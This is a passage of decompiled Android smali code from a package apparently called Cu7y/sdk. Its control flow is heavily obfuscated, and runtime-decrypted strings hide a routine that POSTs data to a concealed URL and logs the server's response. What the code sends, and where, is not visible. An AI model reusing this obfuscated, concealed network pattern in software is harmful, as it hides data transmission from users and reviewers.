    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_f

    goto :goto_18

    :sswitch_33
    const-string v2, "\u06df\u06e2\u06db\u06e8\u06dc\u06e5\u06d8\u06d8\u06e1\u06e2\u06e7\u06e7\u06eb\u06e7\u06dc\u06dc\u06e2\u06e6\u06d8\u06e6\u06e1\u06d6\u06ec\u06e2\u06df\u06e4\u06e8\u06e6\u06d8\u06da\u06ec\u06e6\u06ec\u06db\u06df\u06e8\u06df\u06d9\u06e1\u06df\u06e5\u06d7\u06e8\u06d8\u06da\u06e8\u06e8\u06e5\u06df\u06dc\u06d8\u06dc\u06dc\u06d9\u06d8\u06d8\u06e2"

    goto :goto_18

    :cond_6
    const-string v2, "\u06db\u06da\u06d6\u06d8\u06e4\u06d9\u06db\u06e6\u06d7\u06da\u06db\u06db\u06e6\u06eb\u06d6\u06d8\u06d8\u06e0\u06d9\u06d8\u06d8\u06e2\u06e8\u06ec\u06ec\u06e6\u06e0\u06eb\u06e6\u06e1\u06d6\u06d9\u06e2\u06df\u06e8\u06d6\u06d8\u06dc\u06e2\u06ec\u06da\u06d9\u06db\u06eb\u06e6\u06e7"

    goto :goto_18

    :sswitch_34
    if-nez v4, :cond_6

    const-string v2, "\u06e5\u06da\u06e7\u06e4\u06d6\u06d7\u06e1\u06e2\u06e8\u06df\u06e7\u06e5\u06d8\u06e5\u06da\u06e1\u06d8\u06d6\u06e6\u06d7\u06e1\u06d8\u06d6\u06e0\u06e6\u06e4\u06e2\u06d9\u06e8\u06e2\u06e4\u06d6\u06e4\u06e2\u06d9\u06eb\u06d9\u06eb\u06e1\u06d9\u06e1\u06d9\u06da\u06eb\u06dc\u06ec\u06d6\u06d8\u06e8\u06d9\u06e8"

    goto :goto_18

    :sswitch_35
    const-string v2, "\u06d6\u06e1\u06db\u06d6\u06db\u06ec\u06eb\u06d6\u06df\u06e4\u06e4\u06e4\u06d9\u06d9\u06d6\u06e4\u06dc\u06e8\u06da\u06df\u06e5\u06d6\u06d6\u06dc\u06d8\u06ec\u06df\u06e6\u06d8\u06db\u06e2\u06d9\u06e2\u06d8\u06e1\u06d8\u06eb\u06e6\u06d8\u06db\u06d6\u06d8\u06d7\u06e5\u06e7\u06e6\u06e7\u06d8\u06d8\u06ec\u06e4\u06e5\u06ec\u06e5\u06d8\u06dc\u06e6\u06e1\u06d8"

    goto/16 :goto_c

    :sswitch_36
    const-string v2, "\u06dc\u06e5\u06e0\u06dc\u06d9\u06d9\u06d8\u06e1\u06d7\u06e2\u06dc\u06d7\u06d6\u06db\u06e6\u06da\u06e1\u06e2\u06da\u06e7\u06d7\u06e4\u06e8\u06d6\u06d8\u06df\u06e2\u06e8\u06d8\u06ec\u06d8\u06e1\u06d9\u06d9\u06eb\u06e4\u06e7\u06da\u06e7\u06e2\u06e2\u06db\u06db\u06e0"

    goto/16 :goto_c

    :sswitch_37
    :try_start_c
    const-string v2, "HIdNvS1b8Xps0Hj87LBLKVuPMOkqGLBgEYRZ\n"

    const-string v4, "9DjWWKj+GME=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "lAZztQ==\n"

    const-string v10, "/WgV2oR+lyM=\n"

    invoke-static {v4, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    const-string v4, "bNrjDg==\n"

    const-string v6, "PJWwWnLr0uM=\n"

    invoke-static {v4, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/16 v4, 0x2710

    invoke-virtual {v2, v4}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    const/16 v4, 0x2710

    invoke-virtual {v2, v4}, Ljava/net/URLConnection;->setReadTimeout(I)V

    const/4 v4, 0x1

    invoke-virtual {v2, v4}, Ljava/net/URLConnection;->setDoOutput(Z)V

    const-string v4, "CQqduzk2PyYeHIOq\n"

    const-string v6, "SmXzz1xYSws=\n"

    invoke-static {v4, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v6, "IaIHZ+8vmgApvRkk/mGMAzf/EWT0IdYBMr4SZeUjnxEk\n"

    const-string v10, "QNJ3C4ZM+3Q=\n"

    invoke-static {v6, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v4, v6}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v4, Ljava/io/BufferedOutputStream;

    invoke-virtual {v2}, Ljava/net/URLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/io/BufferedOutputStream;-><init>(Ljava/io/OutputStream;)V

    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v4}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v4

    const v8, -0x19db671b

    const-string v6, "\u06e0\u06d8\u06d6\u06d8\u06e2\u06e5\u06e8\u06e7\u06df\u06e0\u06e2\u06e5\u06d8\u06e8\u06e6\u06dc\u06e7\u06e0\u06db\u06d8\u06eb\u06d6\u06dc\u06e0\u06d8\u06ec\u06e0\u06e4\u06e4\u06e0\u06da"

    :goto_19
    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_a

    move-result v10

    xor-int/2addr v10, v8

    sparse-switch v10, :sswitch_data_10

    goto :goto_19

    :sswitch_38
    :try_start_d
    sget-object v5, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "GnPw2/Ji7XF8Fvqn\n"

    const-string v10, "/flGPXLjCtE=\n"

    invoke-static {v8, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v8, "NQmwAVE4WXGXwSxrGzcH\n"

    const-string v10, "FSSQ6f6Pv8A=\n"

    invoke-static {v8, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :goto_1a
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_2

    move v5, v4

    goto/16 :goto_d

    :sswitch_39
    :try_start_e
    const-string v6, "\u06dc\u06db\u06ec\u06db\u06d7\u06e1\u06e7\u06e0\u06dc\u06df\u06d6\u06e2\u06e0\u06e6\u06e6\u06e8\u06e2\u06d6\u06d8\u06eb\u06da\u06dc\u06d8\u06df\u06e8\u06e1\u06d8\u06dc\u06d6\u06e0\u06e1\u06db\u06e0\u06e2\u06d9\u06d8\u06d8\u06d9\u06d8\u06e8\u06d8\u06d6\u06e6\u06d8\u06d9\u06e6\u06dc\u06d8"

    goto :goto_19

    :sswitch_3a
    const v10, 0x1c8910b1

    const-string v6, "\u06d6\u06e1\u06eb\u06e6\u06e6\u06e5\u06d8\u06db\u06d9\u06e6\u06eb\u06ec\u06e4\u06e2\u06dc\u06e2\u06ec\u06d8\u06e5\u06d7\u06db\u06e4\u06eb\u06e0\u06e1\u06d9\u06d9\u06e1\u06e7\u06db\u06e7\u06e0\u06e0\u06db\u06e4\u06d8\u06e7\u06d8\u06e8\u06d8\u06dc\u06e4\u06e4\u06ec\u06e0\u06e2\u06d7\u06da\u06e7\u06e8\u06d8\u06e4\u06d8\u06dc\u06e0\u06d8\u06e5\u06d8"

    :goto_1b
    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_11

    goto :goto_1b

    :sswitch_3b
    const-string v6, "\u06e6\u06e1\u06d6\u06da\u06d7\u06db\u06dc\u06e5\u06e4\u06e7\u06df\u06db\u06e8\u06e4\u06d9\u06e6\u06df\u06e8\u06e5\u06e6\u06e2\u06e2\u06e7\u06e8\u06e0\u06dc\u06e8\u06da\u06d9\u06da\u06e2\u06e6\u06e4\u06db\u06d7\u06e1\u06eb\u06dc\u06e5\u06e6\u06e5"

    goto :goto_1b

    :cond_7
    const-string v6, "\u06e2\u06e5\u06e0\u06d9\u06e6\u06dc\u06d8\u06e0\u06e6\u06eb\u06d7\u06dc\u06e7\u06d8\u06e6\u06ec\u06d8\u06eb\u06d8\u06df\u06e2\u06df\u06dc\u06d8\u06e4\u06e5\u06d8\u06d8\u06ec\u06e5\u06d9\u06db\u06e5\u06e5\u06d8\u06df\u06e5\u06e1\u06e6\u06e2\u06d8"

    goto :goto_1b

    :sswitch_3c
    const/16 v6, 0xc8

    if-ne v4, v6, :cond_7

    const-string v6, "\u06d8\u06e5\u06eb\u06e1\u06df\u06d6\u06d8\u06da\u06da\u06e6\u06e4\u06e8\u06e6\u06d8\u06e4\u06e8\u06d8\u06eb\u06e2\u06e1\u06d8\u06e1\u06da\u06df\u06d6\u06d9\u06dc\u06e8\u06e2\u06e5\u06d8\u06db\u06d7\u06db\u06e0\u06e5\u06e7\u06d6\u06dc\u06e5\u06d8\u06e5\u06e6\u06d8\u06d9\u06e4\u06d7\u06d8\u06d7\u06e8\u06e7\u06e6\u06e6\u06e0\u06eb\u06df\u06eb\u06ec\u06d7"

    goto :goto_1b

    :sswitch_3d
    const-string v6, "\u06e5\u06dc\u06d9\u06e0\u06e0\u06d9\u06e6\u06db\u06db\u06e1\u06e5\u06e6\u06ec\u06db\u06d9\u06d6\u06e6\u06e5\u06d8\u06da\u06d6\u06df\u06e2\u06d9\u06df\u06e0\u06e4\u06e8\u06e1\u06da\u06dc\u06d8\u06e0\u06dc\u06db\u06d8\u06e1\u06dc\u06dc\u06e6\u06d6\u06e8\u06ec\u06dc\u06d8\u06e1\u06e8\u06d8\u06d8\u06e4\u06e6\u06da\u06e8\u06dc\u06eb\u06dc\u06e0\u06e1"
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_a

    goto :goto_19

    :sswitch_3e
    const-string v6, "\u06e4\u06e2\u06e5\u06d8\u06e6\u06e4\u06d8\u06e1\u06da\u06d8\u06d8\u06dc\u06d8\u06e5\u06db\u06e7\u06d8\u06d6\u06e2\u06da\u06e2\u06d9\u06dc\u06d8\u06df\u06e0\u06d8\u06d8\u06e7\u06df\u06db\u06ec\u06e6\u06e6\u06e7\u06e5\u06e5\u06d8\u06e7\u06d6\u06e4"

    goto :goto_19

    :sswitch_3f
    :try_start_f
    sget-object v5, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "mnXf1kM6UOf8ENWq\n"

    const-string v10, "ff9pMMO7t0c=\n"

    invoke-static {v8, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v8, "QDEqJL/ZS0Pi+qdv9dYV\n"

    const-string v10, "YBwKzBBurfI=\n"

    invoke-static {v8, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v6, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-virtual {v2}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v5, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v6, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    :goto_1c
    invoke-virtual {v6}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v8

    const v10, 0x29fcc9e9

    const-string v5, "\u06e4\u06d9\u06e0\u06e2\u06e7\u06e1\u06e1\u06e8\u06ec\u06d9\u06e0\u06e2\u06e4\u06e2\u06e1\u06d8\u06d8\u06ec\u06eb\u06e2\u06db\u06d6\u06e5\u06d6\u06ec\u06e1\u06d7\u06d8\u06e8\u06d9\u06ec\u06d6\u06e6\u06dc\u06d8\u06e2\u06df\u06da\u06e6\u06e1\u06e5\u06d6\u06d7\u06e4\u06db\u06d7\u06d8\u06d8\u06e7\u06df\u06d8\u06d8\u06d9\u06e6\u06e6\u06d8\u06da\u06d9\u06dc\u06d8"

    :goto_1d
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_12

    goto :goto_1d

    :sswitch_40
    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_2

    goto :goto_1c

    :catch_2
    move-exception v2

    move v5, v4

    :goto_1e
    :try_start_10
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "tA6S8gLJj+nqU7uYSdHlo+UN5aY2\n"

    const-string v8, "XbUKGqxtZ0Y=\n"

    invoke-static {v6, v8}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "rogAgqgVLAX6wirCxBloR96a\n"

    const-string v6, "SyqeZyK1yaE=\n"

    invoke-static {v2, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "HCNROeU=\n"

    const-string v6, "eVEjVpfnuHQ=\n"

    invoke-static {v4, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_3

    goto/16 :goto_d

    :catch_3
    move-exception v2

    :goto_1f
    const/4 v4, 0x0

    const/4 v5, 0x0

    aget v5, p4, v5

    add-int/lit8 v5, v5, 0x1

    aput v5, p4, v4

    const-string v4, "xiuoozTpaIeiUrr8RPAX\n"

    const-string v5, "ILcCRKtMjTs=\n"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v4, v5, v6, v2}, LCu7y/sdk/r;->d(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/lang/Exception;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "Jy6i5TA=\n"

    const-string v5, "QlzQikInWZk=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    move-object v2, v3

    :goto_20
    const v4, 0x21aef337

    const-string v3, "\u06e4\u06e0\u06e8\u06e6\u06e8\u06ec\u06eb\u06d6\u06df\u06ec\u06d7\u06e5\u06e4\u06e4\u06df\u06dc\u06d7\u06e4\u06d6\u06e5\u06e6\u06d8\u06e7\u06d8\u06ec\u06e4\u06da\u06e0\u06ec\u06d8\u06e2\u06db\u06db\u06e7\u06d9\u06e2\u06e5\u06ec\u06df\u06e4\u06d6\u06d8\u06e7"

    :goto_21
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_13

    goto :goto_21

    :sswitch_41
    const/4 v3, 0x0

    const/4 v4, 0x0

    aput v4, p4, v3

    const v4, -0x200d397f

    const-string v3, "\u06e4\u06e7\u06e8\u06e8\u06e8\u06dc\u06d8\u06e5\u06eb\u06ec\u06d9\u06eb\u06dc\u06d8\u06e7\u06e8\u06da\u06eb\u06e5\u06e1\u06d8\u06ec\u06d8\u06db\u06ec\u06db\u06dc\u06d8\u06e0\u06d9\u06d6\u06dc\u06da\u06e0"

    :goto_22
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_14

    goto :goto_22

    :sswitch_42
    const/4 v3, 0x0

    aget v3, p2, v3

    add-int/lit8 v3, v3, 0x1

    move-object/from16 v0, p1

    array-length v4, v0

    rem-int v4, v3, v4

    const/4 v3, 0x0

    aput v4, p2, v3

    const v5, -0x4a809e34

    const-string v3, "\u06db\u06e7\u06ec\u06eb\u06e1\u06e1\u06d8\u06d7\u06d9\u06e6\u06d8\u06e7\u06e4\u06df\u06d7\u06dc\u06d9\u06db\u06d9\u06e6\u06e8\u06e2\u06d8\u06e6\u06df\u06eb\u06e4\u06e5\u06e1\u06d8\u06e1\u06eb\u06dc\u06d8"

    :goto_23
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_15

    goto :goto_23

    :sswitch_43
    const/4 v3, 0x0

    const/4 v4, 0x1

    aput-boolean v4, p7, v3

    const/4 v3, 0x0

    const/4 v4, 0x1

    aput v4, p0, v3

    :goto_24
    :sswitch_44
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "2Q4Vb6ztScGLYCMLxNMRi6EGfTW7\n"

    const-string v5, "PIaSiSFPoW4=\n"

    invoke-static {v3, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const v5, -0x198971c7

    const-string v3, "\u06e7\u06d6\u06d7\u06e7\u06e5\u06e7\u06db\u06ec\u06da\u06db\u06d8\u06df\u06e8\u06e5\u06df\u06d9\u06e4\u06e8\u06d8\u06d8\u06dc\u06db\u06e7\u06db\u06e4\u06d7\u06d7\u06e5\u06e5\u06db\u06eb\u06e6\u06e2\u06d7\u06db\u06e2\u06e5\u06d8\u06e8\u06e0\u06e4\u06df\u06db\u06e7"

    :goto_25
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_16

    goto :goto_25

    :sswitch_45
    const v6, -0xe3d2fa7    # -1.929343E30f

    const-string v3, "\u06e4\u06e7\u06db\u06e0\u06ec\u06e7\u06db\u06e4\u06e2\u06df\u06d6\u06d8\u06eb\u06d8\u06e1\u06ec\u06e0\u06e2\u06dc\u06e6\u06e7\u06d8\u06e0\u06e6\u06e5\u06e7\u06e0\u06e6\u06d8\u06d8\u06e0\u06d7\u06e5\u06e8\u06e5\u06d8\u06da\u06d7\u06e6\u06d8\u06e1\u06ec\u06e7\u06df\u06da\u06e6\u06d8"

    :goto_26
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_17

    goto :goto_26

    :sswitch_46
    const-string v3, "\u06e0\u06d8\u06e8\u06df\u06df\u06db\u06e1\u06e5\u06dc\u06d7\u06d6\u06e1\u06e6\u06df\u06df\u06e1\u06da\u06e2\u06e2\u06eb\u06ec\u06dc\u06d8\u06e2\u06e5\u06e5\u06e6\u06d6\u06e0\u06eb\u06d6\u06db\u06dc\u06da\u06e1"

    goto :goto_25

    :sswitch_47
    :try_start_11
    const-string v5, "\u06e2\u06e2\u06dc\u06d8\u06e4\u06d7\u06da\u06dc\u06e7\u06e5\u06d8\u06df\u06e5\u06e6\u06d8\u06e5\u06e1\u06d8\u06e7\u06e6\u06e5\u06d8\u06e8\u06ec\u06e5\u06df\u06dc\u06e5\u06d8\u06d8\u06e5\u06dc\u06d8\u06db\u06e5\u06e5\u06d8\u06e0\u06df\u06e5\u06e2\u06d7\u06e8\u06d9\u06e8\u06dc\u06d8\u06d8\u06d8\u06e7\u06e4\u06d8\u06d8\u06e2\u06dc\u06e5\u06d8\u06e4\u06ec\u06e0"

    goto/16 :goto_1d

    :sswitch_48
    const v11, 0xb6cd3d4

    const-string v5, "\u06e6\u06d8\u06e7\u06d8\u06e5\u06ec\u06e1\u06d8\u06e7\u06dc\u06e4\u06e8\u06d8\u06da\u06dc\u06d8\u06df\u06df\u06d7\u06e8\u06d8\u06df\u06e2\u06e1\u06e5\u06e5\u06dc\u06e4\u06e8\u06e7\u06d8\u06e0"

    :goto_27
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_18

    goto :goto_27

    :sswitch_49
    const-string v5, "\u06d7\u06df\u06d6\u06e5\u06d7\u06e1\u06e4\u06e6\u06df\u06db\u06e1\u06d8\u06e8\u06df\u06e0\u06e6\u06d6\u06e8\u06e0\u06df\u06df\u06eb\u06e5\u06df\u06d7\u06df\u06d9\u06da\u06e1\u06d6\u06d9\u06da\u06d6\u06d6\u06d8\u06d8\u06ec\u06e2\u06e7\u06e0\u06d9\u06df\u06e8\u06e5\u06da\u06d8\u06d6\u06da\u06dc\u06e7\u06dc\u06d8\u06e4\u06da"

    goto :goto_27

    :cond_8
    const-string v5, "\u06df\u06d7\u06e8\u06d8\u06dc\u06e4\u06e5\u06eb\u06e8\u06df\u06ec\u06dc\u06e6\u06d7\u06d7\u06e2\u06da\u06ec\u06d8\u06d8\u06e4\u06e4\u06df\u06ec\u06e2\u06e6\u06d7\u06e0\u06e4\u06e6\u06e6\u06e7\u06d8\u06df\u06e2\u06dc\u06d8\u06e6\u06d9\u06e8\u06d8\u06d7\u06d6\u06d8\u06e4\u06e4\u06d6\u06d8\u06d6\u06e7\u06e8\u06e4\u06e1\u06e8\u06d8\u06d6\u06e5\u06db\u06eb\u06d7\u06e5"

    goto :goto_27

    :sswitch_4a
    if-eqz v8, :cond_8

    const-string v5, "\u06e1\u06e5\u06e0\u06e8\u06e6\u06d7\u06e5\u06da\u06d6\u06e4\u06e5\u06d6\u06d8\u06e1\u06e4\u06e2\u06d9\u06e8\u06e5\u06d8\u06e8\u06e5\u06df\u06e1\u06e8\u06e0\u06e8\u06e0\u06e7\u06e6\u06e8\u06d7\u06d7\u06d8\u06e8\u06e1\u06e1\u06d8\u06db\u06e7\u06da\u06e2\u06eb\u06e1\u06d8\u06df\u06d9\u06eb\u06d6\u06e2\u06d6\u06da\u06ec\u06e0\u06e0\u06d6\u06da"

    goto :goto_27

    :sswitch_4b
    const-string v5, "\u06e1\u06ec\u06e7\u06db\u06e7\u06e5\u06df\u06ec\u06e1\u06d8\u06e6\u06e8\u06d8\u06d8\u06da\u06dc\u06e4\u06da\u06df\u06dc\u06dc\u06d6\u06df\u06ec\u06e8\u06e6\u06d8\u06e2\u06d7\u06d9\u06db\u06d7\u06d6\u06d8\u06e2\u06d8\u06d8\u06df\u06e8\u06db"
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_2

    goto/16 :goto_1d

    :sswitch_4c
    const-string v5, "\u06eb\u06d8\u06e8\u06d8\u06e6\u06e5\u06ec\u06dc\u06db\u06dc\u06d8\u06e0\u06e4\u06dc\u06d8\u06db\u06e2\u06dc\u06d8\u06e2\u06d8\u06d8\u06ec\u06e8\u06dc\u06d8\u06e4\u06d6\u06e6\u06d8\u06d8\u06df\u06e7\u06df\u06e1\u06d8\u06e1\u06da\u06d7\u06db\u06da\u06df"

    goto/16 :goto_1d

    :sswitch_4d
    :try_start_12
    invoke-virtual {v6}, Ljava/io/BufferedReader;->close()V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_2

    goto/16 :goto_1a

    :sswitch_4e
    const-string v2, "\u06e7\u06d7\u06d6\u06db\u06e6\u06dc\u06e6\u06d7\u06e5\u06e6\u06eb\u06df\u06e8\u06e8\u06da\u06eb\u06dc\u06e2\u06da\u06df\u06e5\u06db\u06da\u06e7\u06d9\u06e0\u06e2\u06e0\u06d6\u06d8\u06e8\u06df\u06e8\u06d7\u06eb\u06e1\u06d8\u06da\u06e6\u06d9"

    goto/16 :goto_e

    :cond_9
    const-string v2, "\u06dc\u06e7\u06da\u06e7\u06e1\u06dc\u06d8\u06e6\u06d9\u06d8\u06d6\u06e8\u06e8\u06d7\u06d9\u06da\u06e0\u06e0\u06d6\u06e7\u06da\u06e4\u06da\u06d8\u06eb\u06da\u06e2\u06d6\u06d8\u06e7\u06e2\u06e0"

    goto/16 :goto_f

    :sswitch_4f
    const/16 v2, 0xc8

    if-ne v5, v2, :cond_9

    const-string v2, "\u06d7\u06e8\u06e7\u06d9\u06ec\u06d7\u06d6\u06d6\u06d8\u06e0\u06e1\u06da\u06e7\u06eb\u06e1\u06d8\u06e2\u06e0\u06df\u06db\u06d6\u06da\u06d8\u06d8\u06e6\u06d8\u06eb\u06e5\u06e0\u06db\u06ec\u06e8\u06d8\u06d8\u06e7\u06d6\u06d8\u06e6\u06e8\u06eb\u06df\u06e7\u06e2\u06d8\u06e5\u06d8\u06d8\u06dc\u06d8\u06e5\u06d8\u06e6\u06d9"

    goto/16 :goto_f

    :sswitch_50
    const-string v2, "\u06e2\u06df\u06da\u06d9\u06d6\u06e6\u06e2\u06d9\u06e4\u06e0\u06eb\u06e8\u06e5\u06e2\u06df\u06d9\u06d7\u06db\u06e4\u06e1\u06eb\u06ec\u06dc\u06e8\u06d8\u06df\u06d6\u06e5\u06d8\u06ec\u06eb\u06e1\u06d8\u06db\u06db\u06ec\u06e1\u06e7\u06db"

    goto/16 :goto_f

    :sswitch_51
    const-string v2, "\u06e1\u06e2\u06ec\u06e2\u06d8\u06d8\u06d8\u06d7\u06e5\u06e7\u06d8\u06e5\u06d9\u06e1\u06d8\u06e7\u06d7\u06da\u06ec\u06ec\u06ec\u06db\u06d6\u06da\u06e6\u06e1\u06eb\u06d6\u06e5\u06e1\u06d8\u06d9\u06d7\u06e6\u06d8\u06dc\u06db\u06e7\u06d8\u06eb\u06e7"

    goto/16 :goto_e

    :sswitch_52
    :try_start_13
    const-string v2, "W4T03yPBWncjzsmmsiDTm9YWcQmi\n"

    const-string v4, "sytDOZJDvP8=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "j14=\n"

    const-string v5, "4DXFMGZzwjY=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "IU2Su2091JopT8DtO2+GxA==\n"

    const-string v5, "EH+hj1gL46I=\n"

